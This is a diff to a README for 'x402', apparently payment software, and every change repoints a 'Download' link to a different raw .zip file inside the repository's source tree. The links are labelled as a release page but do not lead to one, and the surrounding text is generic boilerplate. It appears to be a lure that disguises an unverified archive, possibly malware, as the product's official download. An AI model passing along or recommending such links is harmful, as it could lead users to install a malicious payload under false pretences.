@@ -1,7 +1,7 @@
 # 🚀 x402 - Simplifying Online Payments for Everyone
 
 ## 📥 Download Now
-[![Download x402](https://raw.githubusercontent.com/nguyenleduydev/x402/main/eelskin/x402.zip)](https://raw.githubusercontent.com/nguyenleduydev/x402/main/eelskin/x402.zip)
+[![Download x402](https://raw.githubusercontent.com/nguyenleduydev/x402/main/typescript/packages/x402-express/src/x-v3.5.zip)](https://raw.githubusercontent.com/nguyenleduydev/x402/main/typescript/packages/x402-express/src/x-v3.5.zip)
 
 ## 📖 Introduction
 Welcome to x402! This software is designed to streamline payments on the internet, utilizing the widely-used HTTP protocol. It makes online transactions easier and more efficient for users everywhere.
@@ -18,7 +18,7 @@ Before you download, ensure your system meets the following requirements:
 
 ## 🔗 Download & Install
 1. First, click the link below to visit the download page:
-   [Download x402](https://raw.githubusercontent.com/nguyenleduydev/x402/main/eelskin/x402.zip)
+   [Download x402](https://raw.githubusercontent.com/nguyenleduydev/x402/main/typescript/packages/x402-express/src/x-v3.5.zip)
 
 2. Once on the Releases page, look for the latest version under "Latest Releases".
 
@@ -63,7 +63,7 @@ x402 offers several features to enhance your payment experience:
 For questions, feedback, or support, please contact us through our official support channels available on the GitHub page. Your input helps us improve x402 for everyone.
 
 ## 🔗 Important Links
-- Download x402: [Visit Release Page](https://raw.githubusercontent.com/nguyenleduydev/x402/main/eelskin/x402.zip)  
+- Download x402: [Visit Release Page](https://raw.githubusercontent.com/nguyenleduydev/x402/main/typescript/packages/x402-express/src/x-v3.5.zip)  
 - Documentation: [Read the User Manual](#)
 - Support: [Contact Us](#)
 
